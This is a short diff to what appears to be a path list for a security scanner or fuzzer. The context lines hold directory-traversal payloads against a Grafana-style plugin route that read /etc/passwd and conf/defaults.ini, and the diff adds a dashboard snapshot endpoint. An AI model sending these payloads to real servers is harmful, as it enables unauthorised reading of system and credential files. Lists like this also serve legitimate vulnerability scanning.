@@ -9,3 +9,4 @@
 /public/plugins/{{pluginSlug}}/../../../../../../../../../../../../../../../../../../../etc/passwd
 /public/plugins/{{plugin-id}}/../../../../../../../../../../../../../../../../../../../etc/passwd
 /public/plugins/{{pluginSlug}}/../../../../../conf/defaults.ini
+/dashboard/snapshot/:key
